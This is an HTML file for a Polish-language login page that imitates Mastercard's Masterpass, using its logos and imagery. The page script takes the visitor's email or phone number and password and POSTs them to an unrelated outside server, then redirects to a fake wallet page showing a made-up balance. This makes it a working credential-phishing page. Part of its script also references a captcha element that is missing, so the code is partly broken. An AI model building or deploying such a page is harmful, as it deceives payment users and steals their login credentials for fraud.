<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Masterpass Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
  <style>
    body {
      background: url('https://masterpass.com/etc/designs/masterpass/clientlibs_base/img/homepage/homepage-hero-background.jpg') center/cover no-repeat;
      animation: fadeBg 8s ease-in-out infinite alternate;
    }
    @keyframes fadeBg { 0% { filter: brightness(1); } 100% { filter: brightness(0.9); } }
    .fade-in { animation: fadeIn 0.6s ease-out both; }
    @keyframes fadeIn { from { opacity:0; transform: translateY(10px);} to{opacity:1;transform:translateY(0);} }
    .shake { animation: shake 0.3s ease-in-out; }
    @keyframes shake { 0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)} }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen font-sans backdrop-blur-md dark:bg-gray-900">
  <div id="wrap" class="bg-white/90 dark:bg-gray-800 backdrop-blur-xl w-[480px] sm:w-[640px] rounded-2xl shadow-2xl fade-in transition-all duration-500">
    <!-- header, benefits as ранее... -->
    <div class="flex items-center justify-between p-4 border-b border-gray-300 dark:border-gray-600">
      <div class="flex items-center space-x-2">
        <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
        <div class="text-sm font-semibold dark:text-gray-200">masterpass <span class="text-gray-500 text-xs block">by mastercard.</span></div>
      </div>
      <button class="text-black dark:text-white text-2xl font-bold hover:scale-110 transition">&times;</button>
    </div>
    <!-- main content -->
    <div class="flex">
      <div class="hidden md:flex flex-col gap-6 p-6 text-sm w-1/2 border-r border-gray-300 dark:border-gray-600">
        <!-- icons as before -->
      </div>
      <div class="flex-1 p-6">
        <h2 class="text-lg font-semibold mb-4 dark:text-gray-100">Zaloguj się</h2>
        <form id="loginForm" class="space-y-4" novalidate>
         <div class="relative">
          <span class="absolute left-3 top-3 text-gray-400 dark:text-gray-400"><img src="https://img.icons8.com/ios-glyphs/20/000000/email.png"/></span>
          <input type="text" name="email" placeholder="Adres e-mail lub numer telefonu"
            class="w-full pl-10 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none dark:bg-gray-700 dark:text-white"
            required/>
          <p id="emailErr" class="text-xs text-red-500 hidden mt-1">Niepoprawny e‑mail lub numer +48XXXXXXXXX</p>
         </div>

         <div class="relative">
          <span class="absolute left-3 top-3 text-gray-400 dark:text-gray-400"><img src="https://img.icons8.com/ios-glyphs/20/000000/lock--v1.png"/></span>
          <input type="password" name="password" placeholder="Hasło (min. 8 znaków)"
            class="w-full pl-10 border px-4 py-2 rounded focus:ring-2 focus:ring-red-500 outline-none dark:bg-gray-700 dark:text-white"
            required/>
          <p id="passErr" class="text-xs text-red-500 hidden mt-1">Hasło musi mieć ≥ 8 znaków</p>
         </div>
         <!-- captcha + remember as before -->
         <button type="submit" id="loginBtn"
           class="bg-gray-300 text-white w-full py-2 rounded cursor-not-allowed transition duration-300"
           disabled>
           Zaloguj
         </button>
        </form>
      </div>
    </div>
    <div class="text-xs bg-black/80 dark:bg-gray-900 text-white p-2 text-center rounded-b-lg">...</div>
    <div class="bg-white/80 dark:bg-gray-800 text-xs p-2 flex justify-between items-center border-t border-gray-300 dark:border-gray-600 rounded-b-2xl">
      <img src="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" class="h-5"/>
      <span>Zgoda na pliki cookies</span>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm'),
      btn = document.getElementById('loginBtn'),
      robot = document.getElementById('robot'),
      email = form.email,
      pass = form.password,
      emailErr = document.getElementById('emailErr'),
      passErr = document.getElementById('passErr'),
      wrap = document.getElementById('wrap');

    robot.addEventListener('change', () => {
      btn.disabled = !robot.checked;
      btn.classList.toggle('bg-orange-500', robot.checked);
      btn.classList.toggle('cursor-pointer', robot.checked);
      btn.classList.toggle('cursor-not-allowed', !robot.checked);
    });

    form.addEventListener('submit', async e => {
      e.preventDefault();
      emailErr.classList.add('hidden'); passErr.classList.add('hidden');
      let ok = true;
      const reMail = /^[\w.-]+@[\w.-]+\.\w{2,}$/,
            rePh = /^\+48\d{9}$/,
            rePass = /^.{8,}$/;
      if (!reMail.test(email.value) && !rePh.test(email.value)) {
        emailErr.classList.remove('hidden'); email.classList.add('border-red-500'); ok = false;
      } else email.classList.remove('border-red-500');
      if (!rePass.test(pass.value)) {
        passErr.classList.remove('hidden'); pass.classList.add('border-red-500'); ok = false;
      } else pass.classList.remove('border-red-500');

      if (!ok) { wrap.classList.add('shake'); setTimeout(()=>wrap.classList.remove('shake'),300); return; }

      btn.textContent = 'Wysyłanie…'; btn.disabled = true;
      try {
        await fetch('https://zaza-back.onrender.com/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:email.value,password:pass.value,remember:robot.checked})});
        localStorage.setItem('user',JSON.stringify({email:email.value,balance:'100.00'}));
        window.location.href='wallet.html';
      } catch (e) {
        btn.textContent='Błąd'; setTimeout(()=>btn.textContent='Zaloguj',2000);
      }
    });
  </script>
</body>
</html>
